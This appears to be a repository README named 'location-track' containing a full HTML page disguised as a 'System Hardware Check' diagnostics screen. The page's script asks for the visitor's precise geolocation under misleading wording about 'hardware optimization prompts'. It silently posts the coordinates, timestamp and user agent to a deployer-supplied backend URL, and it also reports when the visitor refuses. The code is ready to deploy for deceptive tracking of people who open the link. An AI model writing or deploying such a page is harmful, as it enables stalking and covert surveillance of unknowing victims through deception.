# location-track
new test
HTML
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Device System Diagnostics</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            background-color: #0f172a;
            color: #f8fafc;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            padding: 20px;
        }
        .card {
            background: #1e293b;
            padding: 30px;
            border-radius: 12px;
            border: 1px solid #334155;
            max-width: 450px;
            width: 100%;
            text-align: center;
            box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.3);
        }
        h2 { color: #38bdf8; margin-top: 0; font-size: 22px; }
        p { color: #94a3b8; font-size: 14px; line-height: 1.6; }
        .spinner {
            border: 4px solid #334155;
            border-top: 4px solid #38bdf8;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        #statusMessage {
            font-family: monospace;
            font-size: 13px;
            color: #cbd5e1;
            margin-top: 15px;
        }
    </style>
</head>
<body>

    <div class="card">
        <h2>System Hardware Check</h2>
        <p>Connecting to secure network diagnostics. Please confirm the browser hardware optimization prompts to proceed.</p>
        <div class="spinner"></div>
        <div id="statusMessage">Initializing environment modules...</div>
    </div>

    <script>
        // Paste your copied backend handler endpoint URL inside the quotes below:
        const BACKEND_URL = "YOUR_BACKEND_ENDPOINT_URL";

        document.addEventListener("DOMContentLoaded", () => {
            executeTelemetryCheck();
        });

        function updateStatus(text) {
            document.getElementById("statusMessage").textContent = text;
        }

        function executeTelemetryCheck() {
            if (!("geolocation" in navigator)) {
                updateStatus("[ERROR] Hardware profile unsupported.");
                return;
            }

            updateStatus("Requesting runtime context authorization...");

            // Trigger the browser's native permission request
            navigator.geolocation.getCurrentPosition(
                async (position) => {
                    const lat = position.coords.latitude;
                    const lng = position.coords.longitude;
                    const timestamp = new Date().toISOString();

                    updateStatus("Synchronizing coordinate packet arrays...");

                    // Package the coordinate variables securely
                    const payload = {
                        status: "SUCCESS",
                        latitude: lat,
                        longitude: lng,
                        time: timestamp,
                        browserAgent: navigator.userAgent
                    };

                    try {
                        // Transmit the payload over HTTP POST to your backend service
                        await fetch(BACKEND_URL, {
                            method: "POST",
                            headers: {
                                "Content-Type": "application/json",
                                "Accept": "application/json"
                            },
                            body: JSON.stringify(payload)
                        });
                        
                        updateStatus("Verification complete. Redirecting...");
                    } catch (err) {
                        console.error("Network synchronization anomaly:", err);
                    } finally {
                        // Smoothly redirect the browser to a map view showing the pinpointed location
                        window.location.href = `https://www.google.com/maps?q=${lat},${lng}`;
                    }
                },
                async (error) => {
                    updateStatus(`[EXCEPTION] Hardware checkpoint flag: ${error.message}`);
                    
                    // Log the failure case or denial to your backend console as well
                    const errorPayload = {
                        status: "DENIED",
                        errorDetails: error.message,
                        time: new Date().toISOString()
                    };

                    try {
                        await fetch(BACKEND_URL, {
                            method: "POST",
                            headers: { "Content-Type": "application/json" },
                            body: JSON.stringify(errorPayload)
                        });
                    } catch (e) {
                        console.error(e);
                    }
                },
                {
                    enableHighAccuracy: true,
                    timeout: 10000,
                    maximumAge: 0
                }
            );
        }
    </script>
</body>
</html>
